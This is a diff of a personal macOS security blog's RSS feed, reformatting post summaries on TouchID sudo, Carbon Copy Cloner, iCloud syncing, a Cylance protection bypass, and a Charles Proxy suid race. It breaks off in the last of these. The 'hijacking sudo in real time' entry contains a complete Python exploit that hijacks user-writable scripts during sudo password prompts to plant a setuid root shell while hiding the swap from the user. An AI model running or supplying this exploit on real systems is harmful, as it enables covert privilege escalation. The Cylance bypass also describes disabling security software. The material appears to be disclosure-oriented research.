+authentication.</p><p>Test that this works before proceeding.</p><p>22) Clone my fork of simple-pam: https://github.com/m4rkw/simple-pam</p><p>$ git clone https://github.com/m4rkw/simple-pam</p><p>23) Compile and install the pam module</p><p>$ sudo apt install libpam-dev
 $ cd simple-pam
 $ gcc -fPIC -fno-stack-protector -c src/mypam.c
-$ sudo ld -x --shared -o /lib/security/mypam.so mypam.o
-
-24) Add the auth sufficient line to the top of your /etc/pam.d/sudo file after
-the bangline:
-
---------------
-#%PAM-1.0
-
-auth sufficient mypam.so
---------------
-
-At this point it should work. You should be able to ssh to your remote machine,
-type &quot;sudo bash&quot; and authenticate the sudo escalation with touchID.
-
-How cool is that? :)
-</pre></summary>
+$ sudo ld -x --shared -o /lib/security/mypam.so mypam.o</p><p>24) Add the auth sufficient line to the top of your /etc/pam.d/sudo file after
+the bangline:</p><p><pre>--------------
+#%PAM-1.0</pre></p><p>auth sufficient mypam.so
+--------------</p><p>At this point it should work. You should be able to ssh to your remote machine,
+type "sudo bash" and authenticate the sudo escalation with touchID.</p><p>How cool is that? :)
+</p></summary>
     <title>How to use touchID for sudo remotely over ssh</title>
     <updated>2020-04-18T14:25:39+00:00</updated>
     <dc:date>2020-04-18T14:25:39+00:00</dc:date>
@@ -544,126 +310,72 @@ How cool is that? :)
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>I love Carbon Copy Cloner, it is an awesome piece of software. I frequently rave
-about it to anyone who&#x27;ll listen, it&#x27;s so useful.
-
-It does however seem to have been somewhat limited by the introduction of
-Apple&#x27;s new T2 security chip. I recently purchased one of the new 2020 Macbook
-Airs - a great computer and my first mac with the T2 chip.
-
-My usual process when I get a new mac is to transfer everything over from my old
+    <summary><p>I love Carbon Copy Cloner, it is an awesome piece of software. I frequently rave
+about it to anyone who'll listen, it's so useful.</p><p>It does however seem to have been somewhat limited by the introduction of
+Apple's new T2 security chip. I recently purchased one of the new 2020 Macbook
+Airs - a great computer and my first mac with the T2 chip.</p><p>My usual process when I get a new mac is to transfer everything over from my old
 one using an external SSD and Carbon Copy Cloner. After plugging the drive in to
-the new computer I discovered it wouldn&#x27;t boot from it as the T2 chip has
+the new computer I discovered it wouldn't boot from it as the T2 chip has
 external device boot disabled by default. Not a major problem, it was simple
-enough to enable it.
-
-So I booted into my clone drive, opened CCC and created a restore task. I
-clicked go and then the unexpected happened - CCC said it couldn&#x27;t proceed
-because the source drive was FileVault encrypted but the destination wasn&#x27;t. I
-hadn&#x27;t seen this before, but the recommended workaround was to simply turn off
+enough to enable it.</p><p>So I booted into my clone drive, opened CCC and created a restore task. I
+clicked go and then the unexpected happened - CCC said it couldn't proceed
+because the source drive was FileVault encrypted but the destination wasn't. I
+hadn't seen this before, but the recommended workaround was to simply turn off
 FileVault on the clone drive. Not ideal but not the end of the world, so I did
-that and everything seemed to work.
-
-After an hour or so the sync was finished and I booted the mac normally, and all
+that and everything seemed to work.</p><p>After an hour or so the sync was finished and I booted the mac normally, and all
 my stuff was there. It took around a day or two to sync all my data back down
 from iCloud, as is normally the case. When that was finally done I thought
-everything was good.. until I tried to set up ApplePay.
-
-&quot;Apple Pay has been disabled because the security settings of this Mac were
-modified&quot;.
-
-Interesting. Also vague, and not super helpful. I rebooted into recovery and
+everything was good.. until I tried to set up ApplePay.</p><p>"Apple Pay has been disabled because the security settings of this Mac were
+modified".</p><p>Interesting. Also vague, and not super helpful. I rebooted into recovery and
 checked the startup security utility - everything looked good, it was set to the
 maximum security level and boot from external devices was disabled. Rebooted but
-again, same error.
-
-I checked the log stream from the terminal and saw it was failing to initialise
-the ApplePay system with an error message that included the phrase &quot;Kext check
-failed&quot;. Interesting. I had a couple of 3rd party kexts loaded so I removed
+again, same error.</p><p>I checked the log stream from the terminal and saw it was failing to initialise
+the ApplePay system with an error message that included the phrase "Kext check
+failed". Interesting. I had a couple of 3rd party kexts loaded so I removed
 them, rebooted, but again got the same error. At this point I started wondering
 if this might be an artefact of having restored from a CCC clone, so I hopped
-onto a friendly irc channel to ask some mac nerds.
-
-I was immediately told that you should never restore a clone onto a T2 mac.
-Instead you have to always use the Migration Assistant or you&#x27;ll run into issues
+onto a friendly irc channel to ask some mac nerds.</p><p>I was immediately told that you should never restore a clone onto a T2 mac.
+Instead you have to always use the Migration Assistant or you'll run into issues
 with the T2 chip just like I did. I was advised to start again with internet
 recovery so I made sure my clone drive was up to date, rebooted, erased the
-startup disk, rebooted again and launched internet recovery.
-
-At this point it was late in the evening and I figured this was going to be a
-time-consuming pain but not the end of the world. Unfortunately things didn&#x27;t
+startup disk, rebooted again and launched internet recovery.</p><p>At this point it was late in the evening and I figured this was going to be a
+time-consuming pain but not the end of the world. Unfortunately things didn't
 quite go to plan. The initial download of the OS from internet recovery seemed
 to work, the machine rebooted and said 12mins remaining but then after a moment
-or two it suddenly bounced back into the GUI and said:
-
-------------
-macOS could not be installed on your computer
-
-An internal error has occurred. : (-69624)
-
-Quit the installer to restart your computer and try again.
-------------
-
-https://m4.rkw.io/img/69624.jpg
-
-This was very disheartening for a brand new machine. Hoping it was some kind of
+or two it suddenly bounced back into the GUI and said:</p><p><pre>------------
+macOS could not be installed on your computer</pre></p><p>An internal error has occurred. : (-69624)</p><p>Quit the installer to restart your computer and try again.
+------------</p><p>https://m4.rkw.io/img/69624.jpg</p><p>This was very disheartening for a brand new machine. Hoping it was some kind of
 transient network issue I rebooted and ran through the process again. Same
 error. I tried removing my startup security password and ran it again, same
-error.
-
-I glanced at my clone drive, remembering it had a recovery partition, and
-thought maybe I could reinstall using that. First I&#x27;d have to enable booting
+error.</p><p>I glanced at my clone drive, remembering it had a recovery partition, and
+thought maybe I could reinstall using that. First I'd have to enable booting
 from external devices, so I tried to open the startup security utility, only to
-find that it refused to do anything because it couldn&#x27;t authentiate me against
-an admin account on the system disk (which was now blank) and I&#x27;d removed my
+find that it refused to do anything because it couldn't authentiate me against
+an admin account on the system disk (which was now blank) and I'd removed my
 password. It seems that it might be worth setting a startup security password
-just to have a fallback authentication method for this scenario.
-
-At this point I did some googling, found a few people who&#x27;d run into the same
+just to have a fallback authentication method for this scenario.</p><p>At this point I did some googling, found a few people who'd run into the same
 issue, one of whom ending up returning his machine for a logic board replacement
 as a result. At this point I was feeling depressed, a 2-day old machine turned
-into a brick because Apple apparently couldn&#x27;t make a reliable recovery service.
-
-Finally as a last resort I went through a methodical sequence of steps:
-
-1) Powered off
+into a brick because Apple apparently couldn't make a reliable recovery service.</p><p>Finally as a last resort I went through a methodical sequence of steps:</p><p><pre>1) Powered off
 2) Reset the PRAM and NVRAM
 3) Booted back into internet recovery and erased the system disk
 4) Powered off, reset PRAM and NVRAM again
-5) Booted back into internet recovery and restarted the installer
-
-I don&#x27;t know if any of these steps made a difference or whether there was a
+5) Booted back into internet recovery and restarted the installer</pre></p><p>I don't know if any of these steps made a difference or whether there was a
 transient issue that resolved itself but thankfully this 3rd time the installer
-worked and the machine was back into a usable state.
-
-After installation I plugged my clone drive in and used the Migration Assistant
-to restore my data. I was actually impressed at how well this worked - I&#x27;d
+worked and the machine was back into a usable state.</p><p>After installation I plugged my clone drive in and used the Migration Assistant
+to restore my data. I was actually impressed at how well this worked - I'd
 always assumed a full-system clone with CCC would be a better experience but the
-Migration Assistant did really well and completed very quickly.
-
-I did run into a few minor issues with it:
-
-1) After it completed my first login attempt resulted in a perpetual spinner,
-but a simple reboot resolved it
-
-2) Some of my system settings were restored to defaults but that&#x27;s not really a
-major problem
-
-Other than those two minor glitches the system is exactly as it would have been
-if I&#x27;d restored from the clone, except that Apple Pay now works and it also
-didn&#x27;t re-download all my photos from iCloud.
-
-So a bumpy road but ultimately successful.
-
-I have since reached out to CCC support to ask them if they&#x27;d consider adding a
+Migration Assistant did really well and completed very quickly.</p><p>I did run into a few minor issues with it:</p><p><pre>1) After it completed my first login attempt resulted in a perpetual spinner,
+but a simple reboot resolved it</pre></p><p>2) Some of my system settings were restored to defaults but that's not really a
+major problem</p><p>Other than those two minor glitches the system is exactly as it would have been
+if I'd restored from the clone, except that Apple Pay now works and it also
+didn't re-download all my photos from iCloud.</p><p>So a bumpy road but ultimately successful.</p><p>I have since reached out to CCC support to ask them if they'd consider adding a
 warning to the application when attempting to restore a clone to a T2 mac.
 Hopefully if they do this it will prevent others from going through the same
 trouble. I can easily imagine many people restoring clones, noticing Apple Pay
-doesn&#x27;t work and not connecting the dots - likely leading to many hours on the
-phone to Apple Support.
-
-Much thanks to Branes and Cpuroast of ##apple for their help in resolving this!
-</pre></summary>
+doesn't work and not connecting the dots - likely leading to many hours on the
+phone to Apple Support.</p><p>Much thanks to Branes and Cpuroast of ##apple for their help in resolving this!
+</p></summary>
     <title>2020 Macbook Air: Carbon Copy Cloner vs the T2 chip</title>
     <updated>2020-04-18T11:53:16+00:00</updated>
     <dc:date>2020-04-18T11:53:16+00:00</dc:date>
@@ -671,29 +383,19 @@ Much thanks to Branes and Cpuroast of ##apple for their help in resolving this!
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>On a mac if you set Cylance&#x27;s &quot;local protection&quot; to &quot;system&quot; it seems to
-disallow all filesystem access to the CylanceSvc service&#x27;s launchd plist file:
-
-/Library/LaunchDaemons/com.cylance.agent_service.plist
-
-This access is completely denied even to the root user. At first glance this
-would appear to prevent all users, including root, from stopping the service.
-
-However launchd does not look at the filename when processing one of these
-files. You can have one called foo.plist and if it&#x27;s Label key is set to the
-same as the Cylance one, eg &quot;com.cylance.agent_service&quot;, then it can be used to
-stop the Cylance service.
-
-So this local protection is fairly weak in terms of stopping the root user from
+    <summary><p>On a mac if you set Cylance's "local protection" to "system" it seems to
+disallow all filesystem access to the CylanceSvc service's launchd plist file:</p><p><pre>/Library/LaunchDaemons/com.cylance.agent_service.plist</pre></p><p>This access is completely denied even to the root user. At first glance this
+would appear to prevent all users, including root, from stopping the service.</p><p>However launchd does not look at the filename when processing one of these
+files. You can have one called foo.plist and if it's Label key is set to the
+same as the Cylance one, eg "com.cylance.agent_service", then it can be used to
+stop the Cylance service.</p><p>So this local protection is fairly weak in terms of stopping the root user from
 disabling Cylance. Also weirdly if I use a separate plist file to stop the
-service when it&#x27;s in this mode, after starting it back up again the original
-plist is left accessible.
-
-Reported both of these issues to Cylance, they seemed to already be aware of the
-first one and just seemed to say it&#x27;s a limitation of the operating system.
-Presumably with SIP locking down all the system files there&#x27;s only so much they
+service when it's in this mode, after starting it back up again the original
+plist is left accessible.</p><p>Reported both of these issues to Cylance, they seemed to already be aware of the
+first one and just seemed to say it's a limitation of the operating system.
+Presumably with SIP locking down all the system files there's only so much they
 can do to interrupt things being done as root.
-</pre></summary>
+</p></summary>
     <title>Cylance local protection seems a bit daft</title>
     <updated>2019-07-25T19:14:56+00:00</updated>
     <dc:date>2019-07-25T19:14:56+00:00</dc:date>
@@ -701,50 +403,32 @@ can do to interrupt things being done as root.
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>I recently had the logic board replaced in my 2017 Macbook Pro. I use the
+    <summary><p>I recently had the logic board replaced in my 2017 Macbook Pro. I use the
 awesome Carbon Copy Cloner to keep an image of my system as a bootable backup
-which can then be easily restored when the machine is returned to me.
-
-This time however I had some issues with iCloud Drive. After restoring the
-backup I found it wasn&#x27;t syncing. I tried the usual troubleshooting steps: turn
-it off, reboot the machine, turn it back on again. Still wasn&#x27;t syncing, just
+which can then be easily restored when the machine is returned to me.</p><p>This time however I had some issues with iCloud Drive. After restoring the
+backup I found it wasn't syncing. I tried the usual troubleshooting steps: turn
+it off, reboot the machine, turn it back on again. Still wasn't syncing, just
 sitting there with all my files and folders seemingly stuck in the state of
-&quot;waiting to download&quot;. I scoured the internet, lots of people with the same
+"waiting to download". I scoured the internet, lots of people with the same
 issue and no obvious solution. Curiously though some of the threads had people
 reporting that their stuff would just suddenly start syncing out of nowhere
-without them having done anything to prompt it.
-
-Well I have AppleCare so with a due sense of exhaustion and dread I gave them a
+without them having done anything to prompt it.</p><p>Well I have AppleCare so with a due sense of exhaustion and dread I gave them a
 call. We started a screen share session so they could see the problem. Their
 first suggestion was to try creating a new user account and seeing if that would
-sync. I took exception to this - I don&#x27;t need this to work on another account, I
+sync. I took exception to this - I don't need this to work on another account, I
 need it to work on *this* account. I hung up the call and decided to investigate
-myself.
-
-I knew from previous messing around with macOS that the main process involved in
-iCloud Drive syncing was bird. I decided to see if it was logging anything:
-
-
-
-
-
-
-
-
+myself.</p><p>I knew from previous messing around with macOS that the main process involved in
+iCloud Drive syncing was bird. I decided to see if it was logging anything:</p><p><pre>
 $ log stream |egrep -i bird
 2019-07-09 18:11:09.546067+0100 0x5afcd    Activity    0x6c4a4              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down
 2019-07-09 18:11:10.672324+0100 0x5afcd    Activity    0x6c4a5              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down
 2019-07-09 18:11:11.626342+0100 0x5afcd    Activity    0x6c4a6              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down
 2019-07-09 18:11:12.629151+0100 0x5afcd    Activity    0x6c4a7              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down
 2019-07-09 18:11:13.496400+0100 0x64538    Activity    0x6c4a8              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down
-2019-07-09 18:11:14.429404+0100 0x5afcd    Activity    0x6c4a9              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down
-
-Interesting. These log messages seem to indicate that it&#x27;s syncing something
-down, but what? My files don&#x27;t appear to be syncing at all. There&#x27;s no obvious
+2019-07-09 18:11:14.429404+0100 0x5afcd    Activity    0x6c4a9              1609   0    bird: (CloudDocsDaemon) server-zone/did-sync-down</pre></p><p>Interesting. These log messages seem to indicate that it's syncing something
+down, but what? My files don't appear to be syncing at all. There's no obvious
 activity in the Finder. Curious I had a look at what files the bird process had
-open:
-
-# lsof -p 1609
+open:</p><p><pre># lsof -p 1609
 COMMAND  PID  USER   FD      TYPE             DEVICE   SIZE/OFF    NODE NAME
 bird    1609 admin  cwd       DIR                1,4        832       2 /
 bird    1609 admin  txt       REG                1,4      26656 1400386 /System/Library/PrivateFrameworks/CloudDocsDaemon.framework/Versions/A/Support/bird
@@ -797,25 +481,15 @@ bird    1609 admin   34r      REG                1,4    4095312 3082859 /Users/a
 bird    1609 admin   35u      REG                1,4 1658200064 3083092 /Users/admin/Library/Application Support/CloudDocs/session/s/com~apple~CloudDocs:0/db.db
 bird    1609 admin   36u      REG                1,4    4321912 3083095 /Users/admin/Library/Application Support/CloudDocs/session/s/com~apple~CloudDocs:0/db.db-wal
 bird    1609 admin   37u      REG                1,4      65536 3083096 /Users/admin/Library/Application Support/CloudDocs/session/s/com~apple~CloudDocs:0/db.db-shm
-bird    1609 admin   38r      REG                1,4     288952  897141 /Library/Application Support/CrashReporter/SubmitDiagInfo.domains
-
-Interesting. Lots of files that end in .db - databases perhaps? The one most
-obviously associated with cloud docs seemed to be:
-
-/Users/admin/Library/Application Support/CloudDocs/session/s/com~apple~CloudDocs:0/db.db
-
-So I went to that directory and had a look. Sure enough this file is a SQLite
-database. What&#x27;s more it was slowing growing in size. So the obvious inference
+bird    1609 admin   38r      REG                1,4     288952  897141 /Library/Application Support/CrashReporter/SubmitDiagInfo.domains</pre></p><p>Interesting. Lots of files that end in .db - databases perhaps? The one most
+obviously associated with cloud docs seemed to be:</p><p><pre>/Users/admin/Library/Application Support/CloudDocs/session/s/com~apple~CloudDocs:0/db.db</pre></p><p>So I went to that directory and had a look. Sure enough this file is a SQLite
+database. What's more it was slowing growing in size. So the obvious inference
 is that this is some kind of metadata database that is being actively synced by
-the system. Presumably when this is done the files themselves could be synced.
-
-And that turned out to be the case. Eventually it finished syncing its metadata
-and the files themselves started appearing. So there wasn&#x27;t actually any
+the system. Presumably when this is done the files themselves could be synced.</p><p>And that turned out to be the case. Eventually it finished syncing its metadata
+and the files themselves started appearing. So there wasn't actually any
 problem, but within the first minute of my call with Apple Support they agreed
 with me that there *was* a problem and would no doubt have wasted hours of my
-time trying to fix something that wasn&#x27;t actually broken.
-
-I haven&#x27;t dug too deeply into how the syncing process works but I have a theory
+time trying to fix something that wasn't actually broken.</p><p>I haven't dug too deeply into how the syncing process works but I have a theory
 about why it stalled for so long in my case. I had some git repos in my iCloud
 Drive that had a *lot* of files in them. One of them had over 77k files. The way
 the SQLite database was growing and the corresponding log messages being
@@ -824,18 +498,14 @@ database one by one or in batches, rather than simply downloading a snapshot of
 it. This is presumably slow because the number of API requests is a factor of
 the number of files for which it has to hold metadata. Somebody with a huge
 number of files in their iCloud Drive would presumably experience this taking
-even longer than I did, especially if they didn&#x27;t have a particularly fast
-internet connection.
-
-Why Apple chose to make this process invisible in the UI is a mystery. Their
+even longer than I did, especially if they didn't have a particularly fast
+internet connection.</p><p>Why Apple chose to make this process invisible in the UI is a mystery. Their
 discussion forums are full of people baffled by this. They must have had endless
 support calls and genius bar visits in relation to it, and in many of those
 cases there may have been nothing actually wrong. The only issue was that the UI
-gives no indication of what it&#x27;s doing so the user thinks it isn&#x27;t doing
-anything
-
-This is bad design.
-</pre></summary>
+gives no indication of what it's doing so the user thinks it isn't doing
+anything</p><p>This is bad design.
+</p></summary>
     <title>The real reason your iCloud Drive isn't syncing</title>
     <updated>2019-07-09T18:34:11+00:00</updated>
     <dc:date>2019-07-09T18:34:11+00:00</dc:date>
@@ -843,22 +513,14 @@ This is bad design.
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>A while ago I posted about how sudo can be easily backdoored by dropping a fake
-sudo script into the user&#x27;s PATH:
-
-https://m4.rkw.io/blog/getting-root-without-an-exploit--stealth-sudo-backdoor.html
-
-Another attack vector for sudo is monitoring the process list for invocations of
+    <summary><p>A while ago I posted about how sudo can be easily backdoored by dropping a fake
+sudo script into the user's PATH:</p><p><pre>https://m4.rkw.io/blog/getting-root-without-an-exploit--stealth-sudo-backdoor.html</pre></p><p>Another attack vector for sudo is monitoring the process list for invocations of
 sudo where the user is being prompted for their sudo password and the target
 script/binary is user-writable. If a rogue process can determine this scenario
 they have a narrow window in which the target script/binary can be replaced with
-something else in order to steal root privileges.
-
-The proof of concept below demonstrates how this can be done, and includes a
+something else in order to steal root privileges.</p><p>The proof of concept below demonstrates how this can be done, and includes a
 simple shell wrapper that forwards the sudo execution on to a copy of the
-original script so the user likely won&#x27;t notice anything.
-
-https://m4.rkw.io/sudo_steal.py.txt
+original script so the user likely won't notice anything.</p><p>https://m4.rkw.io/sudo_steal.py.txt
 0d5bb04be60acf3ebb7a7f16932ebd8b8f75636ede85e4e5bcf1f08fbe5e25da
 -------------------------------------------------------------------------------
 #!/usr/bin/env python2.7
@@ -872,208 +534,98 @@ https://m4.rkw.io/sudo_steal.py.txt
 #
 # in the time it takes you to enter your sudo password, sudo_steal.py will hijack
 # the target in order to steal a root shell, and then pass the execution chain
-# on to a copy of the script so the user running sudo won&#x27;t know anything is amis.
-
-import os
+# on to a copy of the script so the user running sudo won't know anything is amis.</p><p>import os
 import sys
-import time
-
-
-# we can only hijack sudo if the target command/script is writable
-
-def is_writable(path):
+import time</p><p>
+# we can only hijack sudo if the target command/script is writable</p><p>def is_writable(path):
   try:
-    with open(path,&#x27;a+&#x27;) as f:
+    with open(path,'a+') as f:
       pass
     return True
   except:
-    pass
-
-  return False
-
-
+    pass</p><p>  return False</p><p>
 # most user-owned stuff executed with sudo will be at a relative path so we
 # need to recursively search for it as quickly as possible.
 #
 # we only have the time it takes the user to enter their password to find
 # the target and hijack it, so this needs to be as fast as possible. this
 # should be quick enough on most mac or linux systems, but if you have a
-# bunch of directories with lots of files it may be too slow.
-
-def fast_find_file(filename):
-  matches = []
-
-  h = os.environ[&#x27;HOME&#x27;]
-
-  home_path = &quot;%s/%s&quot; % (h, filename)
-
-  if os.path.exists(home_path) and is_writable(home_path):
-    matches.append(home_path)
-
-  dirs = []
-
-  for x in os.popen(&quot;ls -a1 %s&quot; % (h)).read().rstrip().split(&quot;\n&quot;):
-    if os.path.isdir(&quot;%s/%s&quot; % (h, x)) and not os.path.islink(&quot;%s/%s&quot; % (h, x)):
+# bunch of directories with lots of files it may be too slow.</p><p>def fast_find_file(filename):
+  matches = []</p><p>  h = os.environ['HOME']</p><p>  home_path = "%s/%s" % (h, filename)</p><p>  if os.path.exists(home_path) and is_writable(home_path):
+    matches.append(home_path)</p><p>  dirs = []</p><p>  for x in os.popen("ls -a1 %s" % (h)).read().rstrip().split("\n"):
+    if os.path.isdir("%s/%s" % (h, x)) and not os.path.islink("%s/%s" % (h, x)):
       if x not in [
-          &#x27;.&#x27;, &#x27;..&#x27;,
-          &#x27;Library&#x27;,
-          &#x27;Music&#x27;,
-          &#x27;Pictures&#x27;,
-          &#x27;Documents&#x27;,
-          &#x27;Movies&#x27;,
-          &#x27;VirtualBox VMs&#x27;,
-          &#x27;.cups&#x27;,
-          &#x27;.vagrant.d&#x27;,
-          &#x27;.ansible&#x27;
+          '.', '..',
+          'Library',
+          'Music',
+          'Pictures',
+          'Documents',
+          'Movies',
+          'VirtualBox VMs',
+          '.cups',
+          '.vagrant.d',
+          '.ansible'
         ]:
-        dirs.append(&quot;%s/%s&quot; % (h, x))
-
-  cmd = &quot;find %s -type f -name %s 2&gt;/dev/null&quot; % (&quot; &quot;.join(dirs), filename)
-
-  for x in os.popen(cmd).read().rstrip().split(&quot;\n&quot;):
+        dirs.append("%s/%s" % (h, x))</p><p>  cmd = "find %s -type f -name %s 2>/dev/null" % (" ".join(dirs), filename)</p><p>  for x in os.popen(cmd).read().rstrip().split("\n"):
     if os.path.exists(x) and is_writable(x):
-      matches.append(x)
-
-  if len(matches) == 0:
-    return False
-
-  return matches
-
-
-# generate a temporary filename to move the hijacked script to
-
-def get_target(match):
-  target = match + &#x27;x&#x27;
-
-  while os.path.exists(target):
-    target += &#x27;x&#x27;
-
-  return target
-
-
-# check if the process is still alive
-
-def alive(pid):
-  return os.system(&quot;ps %s 1&gt;/dev/null&quot; % (pid)) == 0
-
-
+      matches.append(x)</p><p>  if len(matches) == 0:
+    return False</p><p>  return matches</p><p>
+# generate a temporary filename to move the hijacked script to</p><p>def get_target(match):
+  target = match + 'x'</p><p>  while os.path.exists(target):
+    target += 'x'</p><p>  return target</p><p>
+# check if the process is still alive</p><p>def alive(pid):
+  return os.system("ps %s 1>/dev/null" % (pid)) == 0</p><p>
 # we have a list of paths that may be the target, so hijack and redirect
-# them all
-
-def exploit(pid, matches):
+# them all</p><p>def exploit(pid, matches):
   remap = {}
-  remapped = []
-
-  for match in matches:
-    remap[match] = get_target(match)
-
-    print &quot;hijacking %s...&quot; % (match)
-
-    try:
+  remapped = []</p><p>  for match in matches:
+    remap[match] = get_target(match)</p><p>    print "hijacking %s..." % (match)</p><p>    try:
       # move the target out of the way and drop in a bash redirect script
       # that sets 0:0 and +s on our rootshell payload
       os.rename(match, remap[match])
-      with open(match,&#x27;w&#x27;) as f:
-        f.write(&quot;#!/bin/bash\n&quot;)
-        f.write(&quot;chown 0:0 /tmp/.,\n&quot;)
-        f.write(&quot;chmod 4755 /tmp/.,\n&quot;)
-        f.write(&quot;%s $@\n&quot; % (remap[match]))
+      with open(match,'w') as f:
+        f.write("#!/bin/bash\n")
+        f.write("chown 0:0 /tmp/.,\n")
+        f.write("chmod 4755 /tmp/.,\n")
+        f.write("%s $@\n" % (remap[match]))
       os.chmod(match, 0755)
       remapped.append(match)
     except:
-      pass
-
-  if len(remapped) == 0:
-    print &quot;hijack failed.&quot;
-    return
-
-  success = False
+      pass</p><p>  if len(remapped) == 0:
+    print "hijack failed."
+    return</p><p>  success = False
   while True:
-    if os.stat(&quot;/tmp/.,&quot;).st_uid == 0:
+    if os.stat("/tmp/.,").st_uid == 0:
       success = True
-      break
-
-    if not alive(pid):
-      break
-
-    time.sleep(1)
-
-  # move the hijacked files back into place
+      break</p><p>    if not alive(pid):
+      break</p><p>    time.sleep(1)</p><p>  # move the hijacked files back into place
   for match in remapped:
-    os.rename(remap[match], match)
-
-  if success:
-    os.system(&quot;/tmp/.,&quot;)
-    sys.exit(0)
-
-  print &quot;exploit failed.&quot;
-
-
-# simple rootshell payload
-
-with open(&quot;/tmp/.,.c&quot;,&quot;w&quot;) as f:
-  f.write(&quot;#include &lt;unistd.h&gt;\n&quot;)
-  f.write(&quot;int main(){setuid(0);seteuid(0);execl(\&quot;/bin/bash\&quot;,&quot;)
-  f.write(&quot;\&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;rm -f /tmp/.,; /bin/bash\&quot;,NULL);&quot;)
-  f.write(&quot;return 0;}\n&quot;)
-
-os.system(&quot;gcc -o /tmp/., /tmp/.,.c; rm -f /tmp/.,.c&quot;)
-
-
-# continuously scan for hijackable processes
-
-while True:
-  ps_lines = os.popen(&quot;ps -a -o pid= -o ppid= -o command= |xargs -L1&quot;).read().rstrip().split(&quot;\n&quot;)
-
-  children = {}
-
-  # build a map of children so we can avoid trying to hijack sudo
-  # processes that have children (i.e. already authenticated)
-
-  for line in ps_lines:
-    seg = line.split(&#x27; &#x27;)
+    os.rename(remap[match], match)</p><p>  if success:
+    os.system("/tmp/.,")
+    sys.exit(0)</p><p>  print "exploit failed."</p><p>
+# simple rootshell payload</p><p>with open("/tmp/.,.c","w") as f:
+  f.write("#include <unistd.h>\n")
+  f.write("int main(){setuid(0);seteuid(0);execl(\"/bin/bash\",")
+  f.write("\"bash\",\"-c\",\"rm -f /tmp/.,; /bin/bash\",NULL);")
+  f.write("return 0;}\n")</p><p>os.system("gcc -o /tmp/., /tmp/.,.c; rm -f /tmp/.,.c")</p><p>
+# continuously scan for hijackable processes</p><p>while True:
+  ps_lines = os.popen("ps -a -o pid= -o ppid= -o command= |xargs -L1").read().rstrip().split("\n")</p><p>  children = {}</p><p>  # build a map of children so we can avoid trying to hijack sudo
+  # processes that have children (i.e. already authenticated)</p><p>  for line in ps_lines:
+    seg = line.split(' ')
     pid = seg[0]
-    ppid = seg[1]
-
-    if not ppid in children.keys():
-      children[ppid] = []
-
-    children[ppid].append(pid)
-
-  # look for invocations of sudo that have prompted the user for their password
-  # and where the target binary/script is user-writable
-
-  for line in ps_lines:
-    seg = line.split(&#x27; &#x27;)
-
-    if seg[2] == &#x27;sudo&#x27;:
-      print &quot;potential target: %s&quot; % (line)
-
-      pid = seg[0]
-
-      # if sudo has child processes then it&#x27;s already authenticated
+    ppid = seg[1]</p><p>    if not ppid in children.keys():
+      children[ppid] = []</p><p>    children[ppid].append(pid)</p><p>  # look for invocations of sudo that have prompted the user for their password
+  # and where the target binary/script is user-writable</p><p>  for line in ps_lines:
+    seg = line.split(' ')</p><p>    if seg[2] == 'sudo':
+      print "potential target: %s" % (line)</p><p>      pid = seg[0]</p><p>      # if sudo has child processes then it's already authenticated
       if pid in children.keys():
-        print &quot;%s has children, skipping&quot; % (pid)
-        continue
-
-      args = seg[3:]
-
-      while True:
-        matches = fast_find_file(&quot; &quot;.join(args))
-
-        if matches:
-          break
-
-        args = args[0:len(args)-1]
-
-        if len(args) == 0:
-          break
-
-      if matches:
-        exploit(pid, matches)
-
-  time.sleep(1)
-</pre></summary>
+        print "%s has children, skipping" % (pid)
+        continue</p><p>      args = seg[3:]</p><p>      while True:
+        matches = fast_find_file(" ".join(args))</p><p>        if matches:
+          break</p><p>        args = args[0:len(args)-1]</p><p>        if len(args) == 0:
+          break</p><p>      if matches:
+        exploit(pid, matches)</p><p>  time.sleep(1)
+</p></summary>
     <title>hijacking sudo in real time</title>
     <updated>2018-08-15T22:03:15+00:00</updated>
     <dc:date>2018-08-15T22:03:15+00:00</dc:date>
@@ -1081,87 +633,57 @@ while True:
   <entry>
     <id>http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html</id>
     <link href="http://m4.rkw.io/blog/restricting-macos-egress-with-lulu-and-squid-proxy.html"/>
-    <summary><pre>Charles Proxy is a great mac application for debugging web services and
-inspecting SSL traffic for any application on your machine.
-
-In order to inspect the SSL traffic it needs to configure the system to use a
+    <summary><p>Charles Proxy is a great mac application for debugging web services and
+inspecting SSL traffic for any application on your machine.</p><p>In order to inspect the SSL traffic it needs to configure the system to use a
 proxy so that it can capture the packets and use its custom root CA to decode
-the SSL.
-
-Setting a system-wide proxy requires root permissions so this is handled by an
-suid binary located within the Charles application folder:
-
-/Applications/Charles.app/Contents/Resources/Charles Proxy Settings
-
-Unfortunately this binary is vulnerable to a race condition which allows a local
-user to spawn a root shell. It supports a parameter &quot;--self-repair&quot; which it
+the SSL.</p><p>Setting a system-wide proxy requires root permissions so this is handled by an
+suid binary located within the Charles application folder:</p><p><pre>/Applications/Charles.app/Contents/Resources/Charles Proxy Settings</pre></p><p>Unfortunately this binary is vulnerable to a race condition which allows a local
+user to spawn a root shell. It supports a parameter "--self-repair" which it
 uses to re-set the root+suid permissions on itself, with a graphical dialog
 shown to the user. However if this is called when the binary is already
-root+suid then no password dialog is shown.
-
-It doesn&#x27;t validate the path to itself and uses a simple API call to get the
+root+suid then no password dialog is shown.</p><p>It doesn't validate the path to itself and uses a simple API call to get the
 path to the binary at the time it was invoked. This means that between executing
